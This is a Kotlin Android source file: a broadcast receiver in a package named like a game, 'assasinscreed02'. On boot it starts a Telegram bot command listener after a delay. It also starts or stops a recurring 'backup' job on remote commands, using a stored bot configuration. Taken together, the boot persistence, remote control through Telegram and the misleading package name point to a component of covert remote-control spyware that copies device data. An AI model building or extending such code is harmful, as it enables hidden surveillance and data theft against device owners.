package com.service.assasinscreed02

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class ControlReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "ControlReceiver"
        const val ACTION_CONTROL_BACKUP = "com.service.assasinscreed02.ACTION_CONTROL_BACKUP"
    }

    override fun onReceive(context: Context, intent: Intent) {
        try {
            when (intent.action) {
                ACTION_CONTROL_BACKUP -> {
                    Log.d(TAG, "Recibida acción de control de backup")
                    manejarControlBackup(context, intent)
                }
                Intent.ACTION_BOOT_COMPLETED -> {
                    Log.d(TAG, "Sistema iniciado, configurando workers")
                    configurarWorkersAlInicio(context)
                }
                else -> {
                    Log.d(TAG, "Acción no reconocida: ${intent.action}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error en ControlReceiver: ${e.message}", e)
        }
    }
    
    private fun manejarControlBackup(context: Context, intent: Intent) {
        try {
            val comando = intent.getStringExtra("comando")
            when (comando) {
                "iniciar" -> {
                    Log.d(TAG, "Iniciando backup desde receiver")
                    val config = obtenerConfigBot(context)
                    if (config != null) {
                        val intervalo = obtenerIntervalo(context).toLong()
                        programarBackup(context, intervalo)
                    } else {
                        Log.w(TAG, "Configuración del bot no encontrada")
                    }
                }
                "detener" -> {
                    Log.d(TAG, "Deteniendo backup desde receiver")
                    WorkManager.getInstance(context).cancelUniqueWork("backup_trabajo")
                }
                else -> {
                    Log.w(TAG, "Comando no reconocido: $comando")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error manejando control de backup: ${e.message}", e)
        }
    }
    
    private fun configurarWorkersAlInicio(context: Context) {
        try {
            // Iniciar el listener de comandos de Telegram
            val telegramWorkRequest = OneTimeWorkRequestBuilder<TelegramCommandWorker>()
                .setInitialDelay(2, TimeUnit.MINUTES) // Esperar 2 minutos después del boot
                .build()
                
            WorkManager.getInstance(context).enqueueUniqueWork(
                "telegram_command_listener",
                ExistingWorkPolicy.REPLACE,
                telegramWorkRequest
            )
            
            Log.d(TAG, "Workers configurados al inicio del sistema")
        } catch (e: Exception) {
            Log.e(TAG, "Error configurando workers al inicio: ${e.message}", e)
        }
    }
} 